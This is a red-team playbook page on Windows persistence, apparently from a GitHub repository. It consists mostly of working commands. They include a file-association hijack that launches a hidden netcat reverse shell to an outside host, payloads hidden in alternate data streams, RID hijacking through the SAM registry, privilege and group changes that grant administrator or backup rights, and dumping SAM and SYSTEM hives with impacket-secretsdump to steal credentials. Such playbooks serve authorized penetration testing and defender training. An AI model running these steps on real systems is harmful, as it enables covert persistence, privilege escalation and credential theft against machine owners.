# 5.1 Persistence

## Table of Contents

- [Alternate Data Stream Files (ADS)](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.1-Persistence.md#Alternate-Data-Stream-Files-ADS)
- [Hijack File Associations](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.1-Persistence.md#Hijack-File-Associations)
- [Normal.dotm](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.1-Persistence.md#Normaldotm)
- [Relative ID (RID) Hijacking](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.1-Persistence.md#Relative-ID-RID-Hijacking)
- [Special Privileges and Security Descriptors](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.1-Persistence.md#Special-Privileges-and-Security-Descriptors)
- [User Group Manipulation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.1-Persistence.md#User-Group-Manipulation)

## Alternate Data Stream Files (ADS)

```c
C:\> echo <PAYLOAD> > %USERPROFILE%\AppData:<FILE>
```

<p align="center">
  <img src="https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/files/ads1.png">
</p>

### Listing ADS Files

```c
C:\> dir /r /a %USERPROFILE%\AppData\
```

### Deleting ADS Files

> https://live.sysinternals.com/

```c
C:\> .\streams64.exe -s C:\PATH\TO\FOLDER\
C:\> .\streams64.exe -d C:\PATH\TO\FOLDER\
```

<p align="center">
  <img src="https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/files/ads2.png">
</p>

## Hijacking File Associations

Registry Path.

```c
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\
```

Now search for the desired `file extention` and change the `Programmatic ID (ProgID)`.

```c
HKEY_LOCAL_MACHINE\SOFTWARE\Classes\txtfile\shell\open\command
```

Then build a `PowerShell Script` and place it anywhere on the target.

```c
Start-Process -NoNewWindow "C:\temp\nc64.exe" "-e cmd.exe <LHOST> <LPORT>"
C:\Windows\system32\NOTEPAD.EXE $args[0]
```

Next change the `Registry Key` to point to the script.

```c
powershell -windowstyle hidden C:\Windows\System32\<FILE>.ps1 %1
```

## Normal.dotm

Add a macro to the `Normal.dotm` which get's executed whenever `any` document is opened.

## Relative ID (RID) Hijacking

Get the current `RIDs`.

```c
PS C:\> wmic useraccount get name,sid
```

```c
Name                SID
Administrator       S-1-5-21-1966530601-3185510712-10604624-500
DefaultAccount      S-1-5-21-1966530601-3185510712-10604624-503
Guest               S-1-5-21-1966530601-3185510712-10604624-501
```

Edit the `registry` by using `PsExec64.exe` to add the `RID` of `500`, which is a `Local Administrator` to another user.

```c
PS C:\> PsExec64.exe -i -s regedit
```

Path in Registry.

```c
HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\
```

Under the corresponding key, there will be a vlaue called `F`, which holds the user's effective `RID`. Those are stored
by using `little-endian` notation, so the bytes appear `reversed`.

```c
500 = 0x01F4
```

Switched Bytes.

```c
F401
```

Save it and on the next login, the user should get `RID 500` assigned.

## Special Privileges and Security Descriptors

### Edit Special Privileges

Add `SeBackupPrivilege` and `SeRestore Privilege` to a user.

Export the configuration file.

```c
PS C:\> secedit /export /cfg config.inf
```

Edit the file and add the `username`.

```c
SeBackupPrivilege = *S-1-5-32-544,*S-1-5-32-551,<USERNAME>
SeRestorePrivilege = *S-1-5-32-544,*S-1-5-32-551,<USERNAME>
```

Convert the `.inf` file into a `.sdb` file and load the configuration back into the system.

```c
PS C:\> secedit /import /cfg config.inf /db config.sdb
PS C:\> secedit /configure /db config.sdb /cfg config.inf
```

### Enable WinRM Security Descriptor

Open the `permission window` and add a user, which should granted `Full Control` in order to `remote login`.

```c
PS C:\> Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
```

## User Group Manipulation

Add user to `Local Administrators` group.

```c
PS C:\> net localgroup administrators <USERNAME> /add
```

Add user to `Backup Operators` group.

```c
PS C:\> net localgroup "Backup Operators" <USERNAME> /add
```

Add user to `Remote Desktop Users` group.

```c
PS C:\> net localgroup "Remote Management Users" <USERNAME> /add
```

Disable `LocalAccountTokenFilterPolicy`.

```c
PS C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

Dumping `SAM` and `SYSTEM` files with `Backup Operator` privileges.

```c
PS C:\> reg save hklm\system system.bak
```

```c
PS C:\> reg save hklm\sam sam.bak
```

```c
$ impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

### Previous

- [5 Installation](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5-Installation.md)

### Next

- [5.2 Situational Awareness](https://github.com/0xsyr0/Red-Team-Playbooks/blob/master/5-Installation/5.2-Situational-Awareness.md)
